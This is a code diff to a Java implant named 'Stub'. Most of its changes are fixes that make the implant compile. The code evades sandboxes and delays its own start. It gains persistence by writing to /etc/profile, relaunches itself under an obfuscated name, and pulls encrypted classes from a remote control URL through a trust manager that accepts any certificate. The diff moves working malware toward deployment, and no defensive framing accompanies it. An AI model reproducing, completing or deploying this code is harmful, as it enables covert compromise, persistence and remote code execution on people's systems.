@@ -17,6 +17,7 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.lang.instrument.ClassDefinition;
 import java.lang.instrument.Instrumentation;
+import java.lang.instrument.UnmodifiableClassException;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Hashtable;
@@ -107,10 +108,10 @@ public class Stub
     static public int virtThreshold = 10; //5 for when it's ready
     static private iAgent.security secInst = new iAgent.security();
 
-    public static void main(String[] args)
+    public static void main(String[] args) throws IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
     {
-        //TimeUnit.MILLISECONDS.sleep((rngenerator(3,4))*1000);
-        passThroughJar(getObfuscatedName(getCLass().getProtectionDomain().getCodeSource().getLocation().toUri().getPath()),args);
+        Class currentClass = Class.forName("Stub");
+        passThroughJar(getObfuscatedName(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()),args);
         isAgent = false;
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
@@ -118,7 +119,7 @@ public class Stub
         coreOp(new ArrayList());
     }
 
-    public static void premain(String agentArgs, Instrumentation inst) 
+    public static void premain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
@@ -128,7 +129,7 @@ public class Stub
         coreOp(containsInst);
     }
 
-    public static void agentmain(String agentArgs, Instrumentation inst) 
+    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
@@ -138,23 +139,24 @@ public class Stub
         coreOp(containsInst);
     }
 
-    public static void coreOp(ArrayList containsInst)
+    public static void coreOp(ArrayList containsInst) throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
     {
         
         if (!chkSandbox())
         {
-            jarPath = getCLass().getProtectionDomain().getCodeSource().getLocation().toUri().getPath();
+            Class currentClass = Class.forName("Stub");
+            jarPath = currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
 
             //chk for persistence and add if not present
             if (!chkPersistence() && isAgent)
             {
                 mkPersistence();
             }
-            else if (!chkPersistence && !isAgent)
+            else if (!chkPersistence() && !isAgent)
             {
                 mkPersistence();
                 passThroughJar(jarPath, new String[] {});
-                System.exit();                
+                System.exit(0);                
             }
 
             Instrumentation inst = (Instrumentation) containsInst.get(0);
@@ -181,7 +183,7 @@ public class Stub
         //need to feed it the obfuscated name
         
         String[] cmdArgs = new String[] {"java.exe","-jar",pathToJar};
-        String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.Stream(initArgs)).toArray(String[]::new);
+        String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.stream(initArgs)).toArray(String[]::new);
 
         try
         {
@@ -216,7 +218,7 @@ public class Stub
         String envVarVal = null;
         try
         {
-            evnVarVal = System.getenv(envVar);
+            envVarVal = System.getenv(envVar);
         }
         catch (Exception e)
         {
@@ -231,6 +233,7 @@ public class Stub
         {
             return true;
         }
+        return true;
     }
 
     public static void mkPersistence()
@@ -247,7 +250,8 @@ public class Stub
             {
                 if (!isAgent && !chkPersistence())
                 {
-                    System.exit();
+                    //should probably have a cleanup too
+                    System.exit(1);
                 }
             }
         }
@@ -255,7 +259,7 @@ public class Stub
         {
             if (new File("/etc/profile").isFile())
             {
-                try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath, true))) 
+                try (BufferedWriter writer = new BufferedWriter(new FileWriter("/etc/profile", true))) 
                 {
                     writer.write(String.format("export %s=%s",envVar,jarPath));
                     writer.newLine(); // Add a new line if desired
@@ -277,9 +281,9 @@ public class Stub
     private static byte[] classRequest(String classicalName) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
-
+        InvalidCertificateTrustManager ictm = new InvalidCertificateTrustManager();
         SSLContext sslCon = SSLContext.getInstance("TLS");
-        sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
+        sslCon.init(null, new TrustManager[] {ictm}, null);
         String classNameEncoded = new String(Base64.getUrlEncoder().encode(classicalName.getBytes()));
 
         URL ctrlUrl = new URI(String.format("%s?v=%s",urlData,classNameEncoded)).toURL();
@@ -316,7 +320,7 @@ public class Stub
                 String responseData = connInReader.readLine();
                 connInReader.close();
 
-                byte[] decodedResponseData = secinst.decrypt(
+                byte[] decodedResponseData = secInst.decrypt(
                     Base64.getDecoder().decode(
                         responseData
                     ),
@@ -328,17 +332,17 @@ public class Stub
             }
             else
             {
-                return "null";
+                return "null".getBytes();
             }
         }
         catch (Exception e)
         {
-            return "null";
+            return "null".getBytes();
         }
     }
 
     //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
-    public class InvalidCertificateTrustManager implements X509TrustManager
+    public static class InvalidCertificateTrustManager implements X509TrustManager
     {
         @Override
         public X509Certificate[] getAcceptedIssuers() {
@@ -434,10 +438,10 @@ class iAgent
 
     }
 
-    private static class security
+    static class security
     {
         //replicates my lycanthropy aesgcm
-        private byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+        public byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
             SecretKey key = initKey(keyData);
             Cipher cipher = initCipher();
@@ -447,7 +451,7 @@ class iAgent
             return cipher.doFinal(plaintext);
         }
 
-        private byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+        public byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
         {
             SecretKey key = initKey(keyData);
             Cipher cipher = initCipher();
